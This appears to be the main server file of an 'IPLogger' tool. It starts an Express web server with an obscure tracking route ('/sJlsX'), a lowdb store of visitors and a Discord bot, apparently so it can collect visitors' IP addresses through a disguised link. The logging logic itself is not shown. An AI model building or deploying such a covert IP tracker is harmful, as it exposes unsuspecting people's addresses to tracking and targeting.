/* eslint-disable consistent-return */
const express = require('express');
const fs = require('fs-extra');

const app = express();
const Eris = require('eris');

const utils = require(`${__dirname}/../util`);
const routes = require(`${__dirname}/routes`);
const https = require('https');
const bodyParser = require('body-parser');

const events = require(`${__dirname}/../bot/events`);
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');

const adapter = new FileSync('db.json');
const db = low(adapter);

/** Express Webserver Class */
class IPLogger {
    /**
   * Starting server and bot, handling routing, and middleware
   * @param {object} c - configuration json file
   */
    constructor(c) {
        this.db = db;
        /** Setting LowDB Defaults */
        db.defaults({
            visitors: [],
        })
            .write();
        /** Defintions */
        this.utils = utils;
        this.c = c;
        this.c.discordToken && this.c.discordToken !== undefined && this.c.discrdToken !== null
            ? this.runDiscordBot()
            : console.log('No Discord Token provided...\nContinuing without Discord connection...');
        this.app = app;
        this.app.use(bodyParser.json());
        // All files in /uploads/ are publicly accessible via http
        this.app.use(express.static(`${__dirname}/public/`, {
            extensions: ["html"],
        }));
        // routing
        this.app.get('/sJlsX', routes.logger.bind(this));


        // Begin server
        this.startServer();
    }

    /** Booting up the Discord Bot
   * @returns {void}
   */
    async runDiscordBot() {
        this.bot = new Eris(this.c.discordToken, {
            maxShards: 'auto',
        });
        console.log('Connecting to Discord...');
        this.commands = [];
        this.loadCommands();
        this.bot
            .on('messageCreate', events.messageCreate.bind(this))
            .on('ready', events.ready.bind(this));
        this.bot.connect();
    }

    /** Loads the commands for the discord bot to use in /bot/commands
   * into an array defined before the calling of this function
   * @returns {void}
   */
    async loadCommands() {
        fs.readdir(`${__dirname}/../bot/commands`, (err, files) => {
        /** Commands are pushed to an array */
            files.forEach(file => {
                if (file.toString().includes('.js')) {
                    // eslint-disable-next-line global-require
                    this.commands.push(require(`${__dirname}/../bot/commands/${file.toString()}`));
                    console.log(`Loaded Command: ${file.toString()}`);
                }
            });
        });
    }

    /** Start's the Express server
   * @returns {void}
   */
    async startServer() {
        if (this.c.secure) {
        /** if the secure option is set to true in config,
         *  it will boot in https so long as it detects
         *  key.pem and cert.pem in the src directory
         */
            if (fs.existsSync(`${__dirname}/../key.pem`) && fs.existsSync(`${__dirname}/../cert.pem`)) {
                const privateKey = fs.readFileSync(`${__dirname}/../key.pem`);
                const certificate = fs.readFileSync(`${__dirname}/../cert.pem`);
                https.createServer({
                    key: privateKey,
                    cert: certificate,
                }, this.app).listen(this.c.securePort, '0.0.0.0');
            } else {
            // CF Flexible SSL
            /** if no key & cert pem files are detected,
             * it will still run in secure mode (returning urls with https)
             * so that it's compatible with CF flexible SSL
             * and SSL configurations via a reverse proxy */
                this.app.listen(this.c.securePort, '0.0.0.0', () => {
                    console.logwarning('Server using flexible SSL secure setting\nTo run a full SSL setting, ensure key.pem and cert.pem are in the /src folder');
                });
            }
            console.log(`Secure server listening on port ${this.c.securePort}`);
        } else {
            this.app.listen(this.c.port, '0.0.0.0', () => {
                console.log(`Server listening on port ${this.c.port}`);
            });
        }
    }


    /** Checks to see if server administrator wants to return http or https
   * Using this function instead of req.secure because of
   * Certain possible SSL configurations (CF Flexible SSL)
   * @returns {string} http OR https
   */
    protocol() {
        if (this.c.secure) {
            return 'https';
        }
        return 'http';
    }
}

module.exports = IPLogger;
